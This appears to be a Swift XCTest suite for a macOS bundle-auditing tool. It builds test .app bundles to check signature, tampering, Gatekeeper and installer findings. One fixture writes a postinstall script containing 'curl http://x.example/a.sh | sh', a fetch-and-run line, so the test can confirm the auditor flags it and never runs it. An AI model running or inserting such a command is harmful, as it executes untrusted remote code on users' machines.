import XCTest
@testable import DMGTrustAuditor

/// Synthetic `.app` bundles built on the fly, plus the real DoNotDisturb Installer.app when it is on this machine.
final class AppBundleTests: XCTestCase {
    var dir: URL!
    override func setUpWithError() throws { dir = FileManager.default.temporaryDirectory.appendingPathComponent("app-\(UUID().uuidString)", isDirectory: true); try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true) }
    override func tearDownWithError() throws { try? FileManager.default.removeItem(at: dir) }

    @discardableResult
    private func makeApp(_ name: String, version: String = "1.2.3", sign: Bool = true, executable: URL = URL(fileURLWithPath: "/bin/echo"), extra: ((URL) throws -> Void)? = nil, plist: [String: Any] = [:]) throws -> URL {
        let app = dir.appendingPathComponent("\(name).app")
        let macos = app.appendingPathComponent("Contents/MacOS"), res = app.appendingPathComponent("Contents/Resources")
        try FileManager.default.createDirectory(at: macos, withIntermediateDirectories: true); try FileManager.default.createDirectory(at: res, withIntermediateDirectories: true)
        try FileManager.default.copyItem(at: executable, to: macos.appendingPathComponent("tool"))
        var info: [String: Any] = ["CFBundleIdentifier": "com.example.\(name.lowercased().replacingOccurrences(of: " ", with: ""))", "CFBundleExecutable": "tool", "CFBundleShortVersionString": version, "CFBundleVersion": "7", "CFBundlePackageType": "APPL"]
        info.merge(plist) { $1 }
        try (info as NSDictionary).write(to: app.appendingPathComponent("Contents/Info.plist"))
        try extra?(app)
        if sign { _ = AuditEngine.command("/usr/bin/codesign", ["--force", "--sign", "-", "--deep", app.path]) }
        return app
    }
    private func audit(_ u: URL) -> AuditReport { AuditEngine.audit(AuditInput(file: u, expectedName: "", expectedTeam: "", expectedBundle: "", expectedSHA: "", sourceURL: "")) }
    private func find(_ r: AuditReport, _ prefix: String) -> AuditFinding? { r.findings.first { $0.title.hasPrefix(prefix) } }

    func testAppIsRecognisedByStructureNotJustName() throws {
        let app = try makeApp("Plain")
        XCTAssertEqual(ContentDetector.detect(app).kind, .app)
        let renamed = dir.appendingPathComponent("NoExtension"); try FileManager.default.moveItem(at: app, to: renamed)
        // Without the .app extension a directory is not a bundle for the system either: it must not be mistaken for one.
        XCTAssertEqual(ContentDetector.detect(renamed).kind, .unknown)
    }
    func testSignedAppReportsIdentityVersionArchitecturesAndStructure() throws {
        let r = audit(try makeApp("Signed App"))
        XCTAssertEqual(r.kind, "app")
        XCTAssertEqual(find(r, "Code signature")?.state, .passed)
        XCTAssertTrue(find(r, "Bundle identifier")?.detail.contains("com.example.signedapp") == true)
        XCTAssertTrue(find(r, "Bundle version")?.detail.contains("1.2.3") == true)
        XCTAssertTrue(find(r, "Bundle structure")?.detail.contains("mach-o") == true, find(r, "Bundle structure")?.detail ?? "")
        XCTAssertNotNil(find(r, "Architectures"))
        XCTAssertNotNil(find(r, "Certificate chain"))
        XCTAssertEqual(find(r, "Gatekeeper")?.state, .warning, "an ad-hoc signed app is not accepted by Gatekeeper")
        XCTAssertEqual(r.sha256, "")   // a bundle has no single hash; it must not be invented
    }
    func testUnsignedAppFailsTheSignatureCheck() throws {
        let r = audit(try makeApp("Unsigned", sign: false))
        XCTAssertEqual(find(r, "Code signature")?.state, .failed)
        XCTAssertLessThanOrEqual(r.score, 2)
    }
    func testTamperingAfterSigningIsDetected() throws {
        let app = try makeApp("Tampered", extra: { try Data("hello".utf8).write(to: $0.appendingPathComponent("Contents/Resources/data.txt")) })
        try Data("changed".utf8).write(to: app.appendingPathComponent("Contents/Resources/data.txt"))
        XCTAssertEqual(find(audit(app), "Code signature")?.state, .failed)
    }
    func testMalformedBundleWithoutInfoPlistIsReportedNotCrashed() throws {
        let app = dir.appendingPathComponent("Broken.app"); try FileManager.default.createDirectory(at: app.appendingPathComponent("Contents"), withIntermediateDirectories: true)
        let r = audit(app)
        XCTAssertEqual(find(r, "Bundle structure")?.state, .warning)
    }
    func testInstallerIndicatorsAreListedAsEvidenceAndNeverExecuted() throws {
        let marker = dir.appendingPathComponent("EXECUTED")
        let r = audit(try makeApp("Acme Installer", sign: true, extra: { app in
            let res = app.appendingPathComponent("Contents/Resources")
            try "#!/bin/sh\ntouch \(marker.path)\ncurl http://x.example/a.sh | sh\n".write(to: res.appendingPathComponent("postinstall.sh"), atomically: true, encoding: .utf8)
            try FileManager.default.createDirectory(at: app.appendingPathComponent("Contents/Library/LaunchServices"), withIntermediateDirectories: true)
            try Data("x".utf8).write(to: app.appendingPathComponent("Contents/Library/LaunchServices/com.acme.helper"))
        }))
        let role = find(r, "Installer role")
        XCTAssertEqual(role?.state, .warning)
        XCTAssertTrue(role?.detail.contains("installer") == true && role?.detail.contains("LaunchServices") == true, role?.detail ?? "")
        let script = find(r, "Bundle script")
        XCTAssertEqual(script?.state, .warning, "curl | sh must be flagged")
        XCTAssertFalse(FileManager.default.fileExists(atPath: marker.path), "the analysis must never run the installer's scripts")
    }
    func testEmbeddedPackageAndArchiveAreOpened() throws {
        let r = audit(try makeApp("Carrier", extra: { app in
            let res = app.appendingPathComponent("Contents/Resources")
            _ = AuditEngine.command("/usr/bin/pkgbuild", ["--nopayload", "--identifier", "com.example.inner", "--version", "1", res.appendingPathComponent("inner.pkg").path])
            let src = res.appendingPathComponent("zsrc"); try FileManager.default.createDirectory(at: src, withIntermediateDirectories: true)
            try "echo hi".write(to: src.appendingPathComponent("run.sh"), atomically: true, encoding: .utf8)
            _ = AuditEngine.command("/usr/bin/tar", ["-czf", res.appendingPathComponent("payload.tgz").path, "-C", src.path, "."])
            try FileManager.default.removeItem(at: src)
        }))
        XCTAssertNotNil(find(r, "PKG certificate"), "embedded pkg inspected")
        XCTAssertNotNil(find(r, "Archive extraction"), "embedded archive opened safely")
    }
    func testNestedMachOFilesAreExamined() throws {
        let r = audit(try makeApp("WithHelper", extra: { app in
            let h = app.appendingPathComponent("Contents/Resources/helper"); try FileManager.default.copyItem(at: URL(fileURLWithPath: "/bin/ls"), to: h)
        }))
        XCTAssertTrue(r.findings.contains { $0.title.hasPrefix("Architectures: helper") })
    }
    /// The real case from the issue. Skipped (and reported as skipped) on machines that do not have it.
    func testRealDoNotDisturbInstaller() throws {
        let app = URL(fileURLWithPath: NSHomeDirectory()).appendingPathComponent("Downloads/DoNotDisturb Installer.app")
        guard FileManager.default.fileExists(atPath: app.path) else { throw XCTSkip("DoNotDisturb Installer.app is not in ~/Downloads") }
        let r = audit(app)
        XCTAssertEqual(r.kind, "app")
        XCTAssertEqual(find(r, "Code signature")?.state, .passed)
        XCTAssertTrue(find(r, "Developer ID")?.detail.contains("Objective-See, LLC (VBG97UB4TA)") == true)
        XCTAssertTrue(find(r, "Developer Team ID")?.detail.contains("VBG97UB4TA") == true)
        XCTAssertEqual(find(r, "Gatekeeper")?.state, .passed)
        XCTAssertTrue(find(r, "Gatekeeper")?.detail.contains("Notarized Developer ID") == true)
        XCTAssertEqual(find(r, "Stapled notarization ticket")?.state, .passed)
        XCTAssertTrue(find(r, "Bundle identifier")?.detail.contains("com.objective-see.donotdisturb.installer") == true)
        XCTAssertNotNil(find(r, "Installer role"))
        XCTAssertEqual(r.findings.filter { $0.title == "YARA match" }.count, 0)
        XCTAssertTrue(find(r, "YARA")?.state == .unknown, "no YARA engine is bundled: it must say so, not pretend a clean scan")
    }
}
